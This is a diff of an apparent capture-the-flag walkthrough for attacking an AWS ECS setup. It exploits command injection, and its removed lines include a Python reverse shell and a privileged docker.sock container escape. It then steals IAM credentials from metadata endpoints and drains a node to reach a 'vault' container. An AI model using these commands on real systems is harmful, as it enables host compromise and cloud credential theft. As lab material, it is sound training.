@@ -1,43 +1,41 @@
-1. Exploit the website via command injection.
+1. Find the command injection vulnerability in the website.
 
     ```bash
-    ; export RHOST="10.0.0.1";export RPORT=4242;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+    ; echo 'hello world'
     ```
 
-2. Use the docker.sock to deploy a new container 
+3. Using command injection list the container on the host and get the ID for the privd container.
 
-    `docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host`
+   `; docker ps --format '{{.Names}} -- '`
 
-3. List the container on the host
+   The privd docker ID will be the first field in the output from the following command.
 
-    `docker ps`
+   `; docker ps | grep privd`
 
-4. Get the container credentials from the "privd" container. 
+4. Using command injection get the container credentials from the privd container as well as the host ECS instance.
 
-    ```bash
-        docker exec -it <container_id> sh 
-        wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI `
-    ```
-5. List the clusters in the account 
+   `; docker exec <container id> sh -c 'wget -O- 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI'`
+   `; docker exec ba301a00c81b sh -c 'wget -O- 169.254.169.254/latest/meta-data/iam/security-credentials/ecs-agent'`
 
-    `aws ecs list-clusters --profile privd`
+5. With the privd credentials list the clusters in the account then enumerate the tasks.
 
-6. List tasks in the cluster
+   ```
+   aws ecs list-clusters --profile privd
+   tasks=$(aws ecs list-tasks --cluster my-cluster --profile ecs --query taskArns --out text)
+   aws ecs describe-tasks --cluster my-cluster --profile ecs --tasks $tasks --query 'tasks[].[taskDefinitionArn, taskArn, containerInstanceArn]' --out text
+   ```
 
-    `aws ecs list-tasks --cluster my-cluster --profile privd`
-
-7. List container instances 
-
-    `aws ecs list-container-instances --cluster my-cluster --profile privd `
-
-8. Set container instance to DRANING 
+6. Set the container instance that is running the vault container to DRANING
 
     `aws ecs update-container-instances-state --cluster my-cluster --container-instances <> --status DRAINING`
 
-9. Wait for "Vault" container to be rescheduled. 
+9. Wait for "Vault" container to be rescheduled, this can be checked by running docker via command injection.
 
-    `docker ps`
+    `; docker ps | grep vault`
 
-10. Get the flag from the "vault" container 
+10. Using the command injection on the website get the flag from the "vault" container.
 
-    `docker exec -it <container_id> cat /FLAG.txt`
+    ```
+    ; docker exec 8e9be4ebf17b ls
+    ; docker exec 8e9be4ebf17b cat FLAG.TXT
+    ```
